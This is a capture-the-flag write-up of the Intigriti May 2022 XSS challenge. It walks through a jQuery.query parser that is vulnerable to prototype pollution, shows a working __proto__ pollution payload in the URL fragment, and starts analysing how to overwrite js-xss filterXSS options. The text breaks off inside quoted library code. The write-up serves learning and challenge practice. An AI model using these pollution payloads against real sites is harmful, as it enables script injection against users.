---
layout: post
title: Prototype Pollution to Overwrite XSS filters!
subtitle: XSS | Prototype Pollution
cover-img: /assets/img/wsc.jpg
thumbnail-img: /assets/img/wsc.jpg
share-img: /assets/img/wsc.jpg
tags: [Web]
---


# Intigriti XSS Chal Writeup - May 2022


>## Chal URL: https://challenge-0522.intigriti.io/


# Website:

<img src="https://i.imgur.com/XFLO1lx.png">

`Pollution` is consuming .... 


# Code Analysis:

```html
<!DOCTYPE html>
<html>
<head>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
  <script>
    /**
 * jQuery.query - Query String Modification and Creation for jQuery
 * Written by Blair Mitchelmore (blair DOT mitchelmore AT gmail DOT com)
 * Licensed under the WTFPL (http://sam.zoy.org/wtfpl/).
 * Date: 2009/8/13
 *
 * @author Blair Mitchelmore
 * @version 2.2.3
 *
 **/
new function(settings) { 
  // Various Settings
  var $separator = settings.separator || '&';
  var $spaces = settings.spaces === false ? false : true;
  var $suffix = settings.suffix === false ? '' : '[]';
  var $prefix = settings.prefix === false ? false : true;
  var $hash = $prefix ? settings.hash === true ? "#" : "?" : "";
  var $numbers = settings.numbers === false ? false : true;

  jQuery.query = new function() {
    var is = function(o, t) {
      return o != undefined && o !== null && (!!t ? o.constructor == t : true);
    };
    var parse = function(path) {
      var m, rx = /\[([^[]*)\]/g, match = /^([^[]+)(\[.*\])?$/.exec(path), base = match[1], tokens = [];
      while (m = rx.exec(match[2])) tokens.push(m[1]);
      return [base, tokens];
    };
    var set = function(target, tokens, value) {
      var o, token = tokens.shift();
      if (typeof target != 'object') target = null;
      if (token === "") {
        if (!target) target = [];
        if (is(target, Array)) {
          target.push(tokens.length == 0 ? value : set(null, tokens.slice(0), value));
        } else if (is(target, Object)) {
          var i = 0;
          while (target[i++] != null);
          target[--i] = tokens.length == 0 ? value : set(target[i], tokens.slice(0), value);
        } else {
          target = [];
          target.push(tokens.length == 0 ? value : set(null, tokens.slice(0), value));
        }
      } else if (token && token.match(/^\s*[0-9]+\s*$/)) {
        var index = parseInt(token, 10);
        if (!target) target = [];
        target[index] = tokens.length == 0 ? value : set(target[index], tokens.slice(0), value);
      } else if (token) {
        var index = token.replace(/^\s*|\s*$/g, "");
        if (!target) target = {};
        if (is(target, Array)) {
          var temp = {};
          for (var i = 0; i < target.length; ++i) {
            temp[i] = target[i];
          }
          target = temp;
        }
        target[index] = tokens.length == 0 ? value : set(target[index], tokens.slice(0), value);
      } else {
        return value;
      }
      return target;
    };
    
    var queryObject = function(a) {
      var self = this;
      self.keys = {};
      
      if (a.queryObject) {
        jQuery.each(a.get(), function(key, val) {
          self.SET(key, val);
        });
      } else {
        self.parseNew.apply(self, arguments);
      }
      return self;
    };
    
    queryObject.prototype = {
      queryObject: true,
      parseNew: function(){
        var self = this;
        self.keys = {};
        jQuery.each(arguments, function() {
          var q = "" + this;
          q = q.replace(/^[?#]/,''); // remove any leading ? || #
          q = q.replace(/[;&]$/,''); // remove any trailing & || ;
          if ($spaces) q = q.replace(/[+]/g,' '); // replace +'s with spaces
          
          jQuery.each(q.split(/[&;]/), function(){
            var key = decodeURIComponent(this.split('=')[0] || "");
            var val = decodeURIComponent(this.split('=')[1] || "");
            
            if (!key) return;
            
            if ($numbers) {
              if (/^[+-]?[0-9]+\.[0-9]*$/.test(val)) // simple float regex
                val = parseFloat(val);
              else if (/^[+-]?[1-9][0-9]*$/.test(val)) // simple int regex
                val = parseInt(val, 10);
            }
            
            val = (!val && val !== 0) ? true : val;
            
            self.SET(key, val);
          });
        });
        return self;
      },
      has: function(key, type) {
        var value = this.get(key);
        return is(value, type);
      },
      GET: function(key) {
        if (!is(key)) return this.keys;
        var parsed = parse(key), base = parsed[0], tokens = parsed[1];
        var target = this.keys[base];
        while (target != null && tokens.length != 0) {
          target = target[tokens.shift()];
        }
        return typeof target == 'number' ? target : target || "";
      },
      get: function(key) {
        var target = this.GET(key);
        if (is(target, Object))
          return jQuery.extend(true, {}, target);
        else if (is(target, Array))
          return target.slice(0);
        return target;
      },
      SET: function(key, val) {
        var value = !is(val) ? null : val;
        var parsed = parse(key), base = parsed[0], tokens = parsed[1];
        var target = this.keys[base];
        this.keys[base] = set(target, tokens.slice(0), value);
        return this;
      },
      set: function(key, val) {
        return this.copy().SET(key, val);
      },
      REMOVE: function(key, val) {
        if (val) {
          var target = this.GET(key);
          if (is(target, Array)) {
            for (tval in target) {
                target[tval] = target[tval].toString();
            }
            var index = $.inArray(val, target);
            if (index >= 0) {
              key = target.splice(index, 1);
              key = key[index];
            } else {
              return;
            }
          } else if (val != target) {
              return;
          }
        }
        return this.SET(key, null).COMPACT();
      },
      remove: function(key, val) {
        return this.copy().REMOVE(key, val);
      },
      EMPTY: function() {
        var self = this;
        jQuery.each(self.keys, function(key, value) {
          delete self.keys[key];
        });
        return self;
      },
      load: function(url) {
        var hash = url.replace(/^.*?[#](.+?)(?:\?.+)?$/, "$1");
        var search = url.replace(/^.*?[?](.+?)(?:#.+)?$/, "$1");
        return new queryObject(url.length == search.length ? '' : search, url.length == hash.length ? '' : hash);
      },
      empty: function() {
        return this.copy().EMPTY();
      },
      copy: function() {
        return new queryObject(this);
      },
      COMPACT: function() {
        function build(orig) {
          var obj = typeof orig == "object" ? is(orig, Array) ? [] : {} : orig;
          if (typeof orig == 'object') {
            function add(o, key, value) {
              if (is(o, Array))
                o.push(value);
              else
                o[key] = value;
            }
            jQuery.each(orig, function(key, value) {
              if (!is(value)) return true;
              add(obj, key, build(value));
            });
          }
          return obj;
        }
        this.keys = build(this.keys);
        return this;
      },
      compact: function() {
        return this.copy().COMPACT();
      },
      toString: function() {
        var i = 0, queryString = [], chunks = [], self = this;
        var encode = function(str) {
          str = str + "";
          str = encodeURIComponent(str);
          if ($spaces) str = str.replace(/%20/g, "+");
          return str;
        };
        var addFields = function(arr, key, value) {
          if (!is(value) || value === false) return;
          var o = [encode(key)];
          if (value !== true) {
            o.push("=");
            o.push(encode(value));
          }
          arr.push(o.join(""));
        };
        var build = function(obj, base) {
          var newKey = function(key) {
            return !base || base == "" ? [key].join("") : [base, "[", key, "]"].join("");
          };
          jQuery.each(obj, function(key, value) {
            if (typeof value == 'object') 
              build(value, newKey(key));
            else
              addFields(chunks, newKey(key), value);
          });
        };
        
        build(this.keys);
        
        if (chunks.length > 0) queryString.push($hash);
        queryString.push(chunks.join($separator));
        
        return queryString.join("");
      }
    };
    
    return new queryObject(location.search, location.hash);
  };
}(jQuery.query || {}); // Pass in jQuery.query as settings object

  </script>
  <style>
   // Boring CSS
  </style>
</head>
<body>
<h1 id="root"></h1>
<script>
  var pages = {
    1: `HOME
      <h5>Pollution is consuming the world. It's killing all the plants and ruining nature, but we won't let that happen! Our products will help you save the planet and yourself by purifying air naturally.</h5>`,
    2: `PRODUCTS
      <br>
    <footer>
        <img src="https://miro.medium.com/max/1000/1*Cd9sLiby5ibLJAkixjCidw.jpeg" width="150" height="200" alt="Snake Plant"></img><span>Snake Plant</span>
      </footer>
      <footer>
        <img src="https://miro.medium.com/max/1000/1*wlzwrBXYoDDkaAag_CT-AA.jpeg" width="150" height="200" alt="Areca Palm"></img><span>Areca Palm</span>
      </footer>
    <footer>
        <img src="https://miro.medium.com/max/1000/1*qn_6G8NV4xg_J0luFbY47w.jpeg" width="150" height="200" alt="Rubber Plant"></img><span>Rubber Plant</span>
        </footer>`,
    3: `CONTACT
      <br><br>
      <b>
        <a href="https://www.facebook.com/intigriticom/"><img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" width="50" height="50" alt="Facebook"></img></a>
        <a href="https://www.linkedin.com/company/intigriti/"><img src="https://cdn-icons-png.flaticon.com/512/61/61109.png" width="50" height="50" alt="LinkedIn"></img></a>
        <a href="https://twitter.com/intigriti"><img src="https://cdn-icons-png.flaticon.com/512/124/124021.png" width="50" height="50" alt="Twitter"></img></a>
        <a href="https://www.instagram.com/hackwithintigriti/"><img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" width="50" height="50" alt="Instagram"></img></a>
      </b>
      `,
    4: `
      <div class="dropdown">
        <div id="myDropdown" class="dropdown-content">
          <a href = "?page=1">Home</a>
          <a href = "?page=2">Products</a>
          <a href = "?page=3">Contact</a>
        </div>
      </div>`
  };

  var pl = $.query.get('page');
  if(pages[pl] != undefined){
    console.log(pages);
    document.getElementById("root").innerHTML = pages['4']+filterXSS(pages[pl]);
  }else{
    document.location.search = "?page=1"
  }
</script>
</body>
</html>

```

Too Much Code, Lets Walk through the Code :)

# External Scripts

* https://cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.min.js
* https://code.jquery.com/jquery-3.5.1.js

  `//cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.min.js` is the Support Code for this Challenge. Beautified Version of this code can be Found in `//cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.js` 
  
  `//code.jquery.com/jquery-3.5.1.js` is Jquery Lib Code.
  
  
  # Source Code:
  
 * This Page Required a GET Parameter `page`. like `?page=1`
```javascript
var pl = $.query.get('page');

if(pages[pl] != undefined){

	document.getElementById("root").innerHTML = pages['4']+filterXSS(pages[pl]);

}
else{
	
	document.location.search = "?page=1"

}
```

* What is pages? Pages is a Javascript Object, If the GET parameter `page` is `1`, then the Above Code will innerHTML `<h5>Pollution is cons...</h5>`. 
* According to our input (``?page=<input>``), the Bellow data will be innerHTMLed into the page with Respect to Pages Object which have only 4 Options.


```javascript
var pages = {

1: `HOME

<h5>Pollution is consuming the world. It's killing all the plants and ruining nature, but we won't let that happen! Our products will help you save the planet and yourself by purifying air naturally.</h5>`,

2: `PRODUCTS

<br>

<footer>

<img src="https://miro.medium.com/max/1000/1*Cd9sLiby5ibLJAkixjCidw.jpeg" width="150" height="200" alt="Snake Plant"></img><span>Snake Plant</span>

</footer>

<footer>

<img src="https://miro.medium.com/max/1000/1*wlzwrBXYoDDkaAag_CT-AA.jpeg" width="150" height="200" alt="Areca Palm"></img><span>Areca Palm</span>

</footer>

<footer>

<img src="https://miro.medium.com/max/1000/1*qn_6G8NV4xg_J0luFbY47w.jpeg" width="150" height="200" alt="Rubber Plant"></img><span>Rubber Plant</span>

</footer>`,

3: `CONTACT

<br><br>

<b>

<a href="https://www.facebook.com/intigriticom/"><img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" width="50" height="50" alt="Facebook"></img></a>

<a href="https://www.linkedin.com/company/intigriti/"><img src="https://cdn-icons-png.flaticon.com/512/61/61109.png" width="50" height="50" alt="LinkedIn"></img></a>

<a href="https://twitter.com/intigriti"><img src="https://cdn-icons-png.flaticon.com/512/124/124021.png" width="50" height="50" alt="Twitter"></img></a>

<a href="https://www.instagram.com/hackwithintigriti/"><img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" width="50" height="50" alt="Instagram"></img></a>

</b>

`,

4: `

<div class="dropdown">

<div id="myDropdown" class="dropdown-content">

<a href = "?page=1">Home</a>

<a href = "?page=2">Products</a>

<a href = "?page=3">Contact</a>

</div>

</div>`

};
```


## Source and Sink:
* Source: `?page=<source>`, We can Pass any value here, But there is a If Condition, that Checks if the userinput is not undefined or return something when passed to pages Object.
* Sink: `innerHTML`, If our Input is passed the If condition, Our Input is Filtered and Passed Into `innerHTML`. 

```javascript
var pl = $.query.get('page');

if(pages[pl] != undefined){

	document.getElementById("root").innerHTML = pages['4']+filterXSS(pages[pl]);

}
else{
	
	document.location.search = "?page=1"

}
```

<img src="https://i.imgur.com/hA7KlF7.png">

## How $.query.get('page') Works?

```javascript
new function(settings) { 
  // Various Settings
  var $separator = settings.separator || '&';
  var $spaces = settings.spaces === false ? false : true;
  var $suffix = settings.suffix === false ? '' : '[]';
  var $prefix = settings.prefix === false ? false : true;
  var $hash = $prefix ? settings.hash === true ? "#" : "?" : "";
  var $numbers = settings.numbers === false ? false : true;

  jQuery.query = new function() {
    var is = function(o, t) {
      return o != undefined && o !== null && (!!t ? o.constructor == t : true);
    };
    var parse = function(path) {
      var m, rx = /\[([^[]*)\]/g, match = /^([^[]+)(\[.*\])?$/.exec(path), base = match[1], tokens = [];
      while (m = rx.exec(match[2])) tokens.push(m[1]);
      return [base, tokens];
    };
    var set = function(target, tokens, value) {
      var o, token = tokens.shift();
      if (typeof target != 'object') target = null;
      if (token === "") {
        if (!target) target = [];
        if (is(target, Array)) {
          target.push(tokens.length == 0 ? value : set(null, tokens.slice(0), value));
        } else if (is(target, Object)) {
          var i = 0;
          while (target[i++] != null);
          target[--i] = tokens.length == 0 ? value : set(target[i], tokens.slice(0), value);
        } else {
          target = [];
          target.push(tokens.length == 0 ? value : set(null, tokens.slice(0), value));
        }
      } else if (token && token.match(/^\s*[0-9]+\s*$/)) {
        var index = parseInt(token, 10);
        if (!target) target = [];
        target[index] = tokens.length == 0 ? value : set(target[index], tokens.slice(0), value);
      } else if (token) {
        var index = token.replace(/^\s*|\s*$/g, "");
        if (!target) target = {};
        if (is(target, Array)) {
          var temp = {};
          for (var i = 0; i < target.length; ++i) {
            temp[i] = target[i];
          }
          target = temp;
        }
        target[index] = tokens.length == 0 ? value : set(target[index], tokens.slice(0), value);
      } else {
        return value;
      }
      return target;
    };
    
    var queryObject = function(a) {
      var self = this;
      self.keys = {};
      
      if (a.queryObject) {
        jQuery.each(a.get(), function(key, val) {
          self.SET(key, val);
        });
      } else {
        self.parseNew.apply(self, arguments);
      }
      return self;
    };
    
    queryObject.prototype = {
      queryObject: true,
      parseNew: function(){
        var self = this;
        self.keys = {};
        jQuery.each(arguments, function() {
          var q = "" + this;
          q = q.replace(/^[?#]/,''); // remove any leading ? || #
          q = q.replace(/[;&]$/,''); // remove any trailing & || ;
          if ($spaces) q = q.replace(/[+]/g,' '); // replace +'s with spaces
          
          jQuery.each(q.split(/[&;]/), function(){
            var key = decodeURIComponent(this.split('=')[0] || "");
            var val = decodeURIComponent(this.split('=')[1] || "");
            
            if (!key) return;
            
            if ($numbers) {
              if (/^[+-]?[0-9]+\.[0-9]*$/.test(val)) // simple float regex
                val = parseFloat(val);
              else if (/^[+-]?[1-9][0-9]*$/.test(val)) // simple int regex
                val = parseInt(val, 10);
            }
            
            val = (!val && val !== 0) ? true : val;
            
            self.SET(key, val);
          });
        });
        return self;
      },
      has: function(key, type) {
        var value = this.get(key);
        return is(value, type);
      },
      GET: function(key) {
        if (!is(key)) return this.keys;
        var parsed = parse(key), base = parsed[0], tokens = parsed[1];
        var target = this.keys[base];
        while (target != null && tokens.length != 0) {
          target = target[tokens.shift()];
        }
        return typeof target == 'number' ? target : target || "";
      },
      get: function(key) {
        var target = this.GET(key);
        if (is(target, Object))
          return jQuery.extend(true, {}, target);
        else if (is(target, Array))
          return target.slice(0);
        return target;
      },
      SET: function(key, val) {
        var value = !is(val) ? null : val;
        var parsed = parse(key), base = parsed[0], tokens = parsed[1];
        var target = this.keys[base];
        this.keys[base] = set(target, tokens.slice(0), value);
        return this;
      },
      set: function(key, val) {
        return this.copy().SET(key, val);
      },
      REMOVE: function(key, val) {
        if (val) {
          var target = this.GET(key);
          if (is(target, Array)) {
            for (tval in target) {
                target[tval] = target[tval].toString();
            }
            var index = $.inArray(val, target);
            if (index >= 0) {
              key = target.splice(index, 1);
              key = key[index];
            } else {
              return;
            }
          } else if (val != target) {
              return;
          }
        }
        return this.SET(key, null).COMPACT();
      },
      remove: function(key, val) {
        return this.copy().REMOVE(key, val);
      },
      EMPTY: function() {
        var self = this;
        jQuery.each(self.keys, function(key, value) {
          delete self.keys[key];
        });
        return self;
      },
      load: function(url) {
        var hash = url.replace(/^.*?[#](.+?)(?:\?.+)?$/, "$1");
        var search = url.replace(/^.*?[?](.+?)(?:#.+)?$/, "$1");
        return new queryObject(url.length == search.length ? '' : search, url.length == hash.length ? '' : hash);
      },
      empty: function() {
        return this.copy().EMPTY();
      },
      copy: function() {
        return new queryObject(this);
      },
      COMPACT: function() {
        function build(orig) {
          var obj = typeof orig == "object" ? is(orig, Array) ? [] : {} : orig;
          if (typeof orig == 'object') {
            function add(o, key, value) {
              if (is(o, Array))
                o.push(value);
              else
                o[key] = value;
            }
            jQuery.each(orig, function(key, value) {
              if (!is(value)) return true;
              add(obj, key, build(value));
            });
          }
          return obj;
        }
        this.keys = build(this.keys);
        return this;
      },
      compact: function() {
        return this.copy().COMPACT();
      },
      toString: function() {
        var i = 0, queryString = [], chunks = [], self = this;
        var encode = function(str) {
          str = str + "";
          str = encodeURIComponent(str);
          if ($spaces) str = str.replace(/%20/g, "+");
          return str;
        };
        var addFields = function(arr, key, value) {
          if (!is(value) || value === false) return;
          var o = [encode(key)];
          if (value !== true) {
            o.push("=");
            o.push(encode(value));
          }
          arr.push(o.join(""));
        };
        var build = function(obj, base) {
          var newKey = function(key) {
            return !base || base == "" ? [key].join("") : [base, "[", key, "]"].join("");
          };
          jQuery.each(obj, function(key, value) {
            if (typeof value == 'object') 
              build(value, newKey(key));
            else
              addFields(chunks, newKey(key), value);
          });
        };
        
        build(this.keys);
        
        if (chunks.length > 0) queryString.push($hash);
        queryString.push(chunks.join($separator));
        
        return queryString.join("");
      }
    };
    
    return new queryObject(location.search, location.hash); // Interesting Part Bro :) 
  };
}(jQuery.query || {}); // Pass in jQuery.query as settings object

```

 Uff, Again Too Much Code, Lets Walk Through :)


### Basic Structure

```javascript
new function(){
...
...
	jQuery.query = new function(){
		var is = function() {
			...
		};
		var parse = function() {
			...
		};
		var set = function(){
			...
			...
			...
		};
		var queryObject = function(){
			...
			...
		};
		queryObject.prototype = {
			queryObject: true,
			parseNew: function(){
				...
				...
				...
			};

		has: function(){
			...
		},
		GET: function(){
			...
		},
		get: function(){
			...
		},
		SET: function(){
			...
		},
		set: function(){
			...
		},
		REMOVE: function(){
			...
		},
		remove: function(){
			...
		},
		load: function(){
			...
		},
		empty: function(){
			...
		},
		copy: function(){
			...
		},
		COMPACT: function(){
			...
		},
		compact: function(){
			...
		},
		toString: function(){
			...
			...
			...
		},
	};
	
	return new queryObject(location.search, location.hash)	// Interesting Part :)	

}(jQuery.query || {});

```

* Ok Wait, Don't get Scared. Most of the Code is Unwanted or not used as sink for this Challenge.

* We Already Know, We can Give Control `?page=<value>`.
* `return new queryObject(location.search, location.hash)`. This Part is the Most Interesting Part of the Code. 
* What is queryObject? queryObject is a Constructor Function. Constructor Function automatically Returns the Object, We don't need to Manually write return Statement.

```javascript
var queryObject = function(a) {

var self = this;

self.keys = {};

if (a.queryObject) {

jQuery.each(a.get(), function(key, val) {

self.SET(key, val);

});

} else {

self.parseNew.apply(self, arguments);

}

return self;

};
```
  
* we need to pass one parameter as argument. to queryObject function. 
* If the Function using `this` Keyword, Then the Function is Called Constructor Function. Here, this is mapped to self. `self == this`
* When `queryObject` Function is Called, `location.search and  location.hash` are Concatenated as Single String and passed to `queryObject` function.
* `location.search` will return the GET parameters. like `http://abc.xss?page=2` -> `location.search` will return -> `?page=2`.
* `location.hash` will return strings after fragment part (`#`). like `http://abc.xss?search=20#123` -> `location.hash`->will return `#123`

<img src="https://i.imgur.com/iqpPR1v.png">

* We Can Put Anything after `#` which is passed as argument to `queryObject`, and also which this Does't Break the IF statement [if pages(pl) != undefined{...}]
* Now Our Potential Source is `location.hash`.

---


### Let's Dig Into This :)
I Copied the Full Code and made a Local Setup for Debugging.

### $.query.get
* `$.query.get` required one parameter, where the GET param `page` is passed.
* `return jQuery.extend(true, {}, target);` . Basically `jQuery.extend` will do a merge Operation. In Past, `jQuery.extend` was vulnerable to Prototype Pollution. Not now :(


```javascript
get: function(key) {

	var target = this.GET(key);

	if (is(target, Object))

	return jQuery.extend(true, {}, target);

	else if (is(target, Array))

	return target.slice(0);

	return target;

},

```


* `this.GET(key)`? `is(target, Object)`?
--- 
*   Lets see how `is` function works

```javascript
var is = function(o, t) {

	return o != undefined && o !== null && (!!t ? o.constructor == t : true);

};
```
  
  * we need to pass 2 parameters as arguments to `is` function.
  * Basically `is` function Returns boolean values. 
  * The Purpose if `is` function is to Check the Datatype of first passed argument. 
  * So If, is([],Array) will return true.
  <img src="https://i.imgur.com/yBxzFSm.png">
  
---

* Let see How `this.GET(key)` works

```javascript
GET: function(key) {

	if (!is(key)) return this.keys;

	var parsed = parse(key), base = parsed[0], tokens = parsed[1];

	var target = this.keys[base];

	while (target != null && tokens.length != 0) {

	target = target[tokens.shift()];

	}

	return typeof target == 'number' ? target : target || "";

}
```

* `parse(key)`? 

---

* Lets see How `parse` function works

```javascript
var parse = function(path) {

	var m, rx = /\[([^[]*)\]/g, match = /^([^[]+)(\[.*\])?$/.exec(path),base = match[1], tokens = [];

	while (m = rx.exec(match[2])) tokens.push(m[1]);

	return [base, tokens];

};
```

* This parse Function Required one parameter as argument. 
* Some Weird Regex Matching Stuffs Uff.

`rx:` 


<img src="https://i.imgur.com/LAVkS6X.png">

* In Simple Words, Match all Characters inside `[]`.

* `match = /^([^[]+)(\[.*\])?$/.exec(path)`. Lets Look at the this Regex,


`match:`


<img src="https://i.imgur.com/MgFmFAn.png">

* This `match` regex looks for array or Object Based `path`. like `?lol=a[b]=[c]`.
* This parse function will return 2 values.
<img src="https://i.imgur.com/xIC9xvV.png">

---

* Let again see How  `this.GET(key)`

```javascript
GET: function(key) {

	if (!is(key)) return this.keys;

	var parsed = parse(key), base = parsed[0], tokens = parsed[1];

	var target = this.keys[base];

	while (target != null && tokens.length != 0) {

	target = target[tokens.shift()];

	}

	return typeof target == 'number' ? target : target || "";

}
```

* In `is` function, If we only passed `one` argument, it always return true. Bcoz of this Condition `... o.constructor == t : true`

<img src="https://i.imgur.com/NQZKbOy.png">

* `parsed = parse(key)` Will return 2 values, `base = parsed[0]`, `tokens = parsed[1]`. 1st Return value is stored in `base` and 2nd in `tokens`. `tokens` Data type is `Array`, We already Saw that. 
* `var target = this.keys[base];`. `this.keys`?
* We already Looked into `queryObject`..
	
```javascript
var queryObject = function(a) {

	var self = this;

	self.keys = {};	
	...
	...
};
```

* Ya, this.keys is a Object, `this.keys[base]` should return something, if it does't, then the while Loop condition will be set to False. 

* Lets Again Look into `queryObject` function. 
```javascript
var queryObject = function(a) {

	var self = this;

	self.keys = {};

	if (a.queryObject) {

	jQuery.each(a.get(), function(key, val) {

	self.SET(key, val);

	});

	} else {

	self.parseNew.apply(self, arguments);

	}

	return self;

};
```

* The IF Condition will run if `a.queryObject`  return something. `a` is user  passed argument, `location.search,location.hash`. 
* ELSE, `parseNew` function will be Executed.
* Lets look into`SET(key, val)` and `parseNew`.

* `SET(key, val)`:
* required 2 arguments from user, `key` and `val`.
* we already aware of `parse()` and `set()`?

```javascript
SET: function(key, val) {

	var value = !is(val) ? null : val;

	var parsed = parse(key), base = parsed[0], tokens = parsed[1];

	var target = this.keys[base];



	this.keys[base] = set(target, tokens.slice(0), value);

return this;
```

* Lets Look Into `set` function.
```javascript
var set = function(target, tokens, value) {
	var o, token = tokens.shift();
	if (typeof target != 'object') target = null;
	if (token === "") {
		if (!target) target = [];
		if (is(target, Array)) {
			target.push(tokens.length == 0 ? value : set(null, tokens.slice(0), value));
		} else if (is(target, Object)) {
			var i = 0;
			while (target[i++] != null);
				target[--i] = tokens.length == 0 ? value : set(target[i], tokens.slice(0), value);
		} else {
			target = [];
			target.push(tokens.length == 0 ? value : set(null, tokens.slice(0), value));
			}
		} else if (token && token.match(/^\s*[0-9]+\s*$/)) {
	var index = parseInt(token, 10);
	if (!target) target = [];
	target[index] = tokens.length == 0 ? value : set(target[index], tokens.slice(0), value);
	} else if (token) {
	var index = token.replace(/^\s*|\s*$/g, "");
	if (!target) target = {};
	if (is(target, Array)) {
		var temp = {};
		for (var i = 0; i < target.length; ++i) {
		temp[i] = target[i];
		}

	target = temp;
	}

	target[index] = tokens.length == 0 ? value : set(target[index], tokens.slice(0), value);
		} else {
		return value;
		}
	return target;
};
```

* Yep, It's Big Code. Let me Explain this in Simple Words.
* `tokens.shift();` Basically Shift function will return only one element one by one. 
<img src="https://i.imgur.com/x65IlfL.png">


* This `set` function required 3 arguments. `target, tokens and value`
* `typeof` keyword will return the data type. In the First IF condition, if the datatype of the `target` is not `Object`, then `target` is set to `null`
*  And Other IF ELSE conditions check the datatype of `target` with `is` function and calling `set`. 
* So, According to the datatype of the `target`, this `set` function performs a `merge` operation. `merge` Ya, Prototype Pollution...

---

* Once Again Lets Look into `queryObject` function.

```javascript
var queryObject = function(a) {
      var self = this;
      self.keys = {};
      
      if (a.queryObject) {
        jQuery.each(a.get(), function(key, val) {
          self.SET(key, val);
        });
      } else {
        self.parseNew.apply(self, arguments);
      }
      return self;
    };
```

* So, if `a.queryObject` return something, then `self.SET` will be called. `self` mapped `this`. `self` == `this`
* Else, `self.parsedNew` will be called. 
* The `apply()` method is similar to the `call()` method
<img src="https://i.imgur.com/m1qxXiT.png">


* Let's Look into `parsedNew`. 

```javascript
parseNew: function(){
	var self = this;
	self.keys = {};
	jQuery.each(arguments, function() {
	var q = "" + this;
	q = q.replace(/^[?#]/,''); // remove any leading ? || #
	q = q.replace(/[;&]$/,''); // remove any trailing & || ;
	
	if ($spaces) q = q.replace(/[+]/g,' '); // replace +'s with spaces

	jQuery.each(q.split(/[&;]/), function(){
		var key = decodeURIComponent(this.split('=')[0] || "");
		var val = decodeURIComponent(this.split('=')[1] || "");

		if (!key) return;
		if ($numbers) {
			if (/^[+-]?[0-9]+\.[0-9]*$/.test(val)) // simple float regex
			val = parseFloat(val);
			else if (/^[+-]?[1-9][0-9]*$/.test(val)) // simple int regex
			val = parseInt(val, 10);
			}
		val = (!val && val !== 0) ? true : val;
		self.SET(key, val);
		});
	});

	return self;

}
```

* In `jQuery.each` loop, 

```javascript
var q = "" + this;

q = q.replace(/^[?#]/,''); // remove any leading ? || #

q = q.replace(/[;&]$/,''); // remove any trailing & || ;

if ($spaces) q = q.replace(/[+]/g,' '); // replace +'s with spaces

jQuery.each(q.split(/[&;]/), function(){
...
...
});

```

* Replacing `?,#,&,||` with `''`, and Converting `+` to `' '`. [url-decoding]
* Lets Look into Nested `jQuery.each` - `jQuery.each(q.split(/[&;]/)`

```javascript
var key = decodeURIComponent(this.split('=')[0] || "");
var val = decodeURIComponent(this.split('=')[1] || "");

if (!key) return;
if ($numbers) {
	if (/^[+-]?[0-9]+\.[0-9]*$/.test(val)) // simple float regex
	val = parseFloat(val);

	else if (/^[+-]?[1-9][0-9]*$/.test(val)) // simple int regex
	val = parseInt(val, 10);
}

val = (!val && val !== 0) ? true : val;
self.SET(key, val);

```

Note: `decodeURIComponent(this.split('=')[0] || "");` - decodeURIComponent will be called after the spliting. By URL-encoding the `=`, We can Bypass this `split` function. This will be useful at end.

* `split` keyword is used to split a string according to a `condition` and return as a `list`. like `var a = 'a&c';` -> `a.split('&')` -> `[a,c]`
* Before passing to `SET`, value of `val` is checked if the datatype is `int` or `float`. After the Check, `SET` is called with `key` and `val` as arguments.

# Exploit IDEA:

* Pollution the Object Prototype to Add a new Key-Value Pair. 
* Bypassing `filterXSS` function with prototype Pollution. [will Explain in that part]
<img src="https://i.imgur.com/4EIw1gp.png">

# Exploitation:
* I already Told about the `source`.  (`return new queryObject(location.search, location.hash)`)
* url : `http://localhost/index.html?page=2#a[__proto__][abcd]=xss`
<img src="https://i.imgur.com/yZWpBp9.png">

* Upon changing the from `page=2#payload` -> `page=abcd#a[__proto__][abcd]=xss`

<img src="https://i.imgur.com/G6mo2hZ.png">

* Yep, We Completed 50%. 
* Our Input is Not directly Passed into InnerHTML. 

```javascript
document.getElementById("root").innerHTML = pages['4']+filterXSS(pages[pl]);
```
* Our Input is passed Filtered with `filterXSS` function. 
* This `filterXSS` function comes from `https://cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.js`
* There are 1000's of lines of Code. So, I searched for this `filterXSS` Function. 
* Here is the Function I got.
```javascript
function filterXSS (html, options) {
  var xss = new FilterXSS(options);
  return xss.process(html);
}
```
* We can Pass 2 arguments, but here `filterXSS(pages[pl])`, Only 1 argument is passed. 
* We can't Bypass this Function as Simple. Bcoz there are lot's for check Going Behind this. Bypassing `filterXSS` to get XSS is not intended Solution :)
* `process()`? 
* Upon Searching for `process` in `https://cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.js`
*  I got the `process` function. But the Points is, this `process` function is not directly declared. `process` function is Injected into the Object `PROTOTYPE`. 

```javascript
FilterXSS.prototype.process = function (html) {
  // 兼容各种奇葩输入
  html = html || '';
  html = html.toString();
  if (!html) return '';

  var me = this;
  var options = me.options;
  var whiteList = options.whiteList;
  var onTag = options.onTag;
  var onIgnoreTag = options.onIgnoreTag;
  var onTagAttr = options.onTagAttr;
  var onIgnoreTagAttr = options.onIgnoreTagAttr;
  var safeAttrValue = options.safeAttrValue;
  var escapeHtml = options.escapeHtml;
  var cssFilter = me.cssFilter;

  // 是否清除不可见字符
  if (options.stripBlankChar) {
    html = DEFAULT.stripBlankChar(html);
  }

  // 是否禁止备注标签
  if (!options.allowCommentTag) {
    html = DEFAULT.stripCommentTag(html);
  }

  // 如果开启了stripIgnoreTagBody
  var stripIgnoreTagBody = false;
  if (options.stripIgnoreTagBody) {
    var stripIgnoreTagBody = DEFAULT.StripTagBody(options.stripIgnoreTagBody, onIgnoreTag);
    onIgnoreTag = stripIgnoreTagBody.onIgnoreTag;
  }

  var retHtml = parseTag(html, function (sourcePosition, position, tag, html, isClosing) {
    var info = {
      sourcePosition: sourcePosition,
      position:       position,
      isClosing:      isClosing,
      isWhite:        (tag in whiteList)
    };

    // 调用onTag处理
    var ret = onTag(tag, html, info);
    if (!isNull(ret)) return ret;

    // 默认标签处理方法
    if (info.isWhite) {
      // 白名单标签，解析标签属性
      // 如果是闭合标签，则不需要解析属性
      if (info.isClosing) {
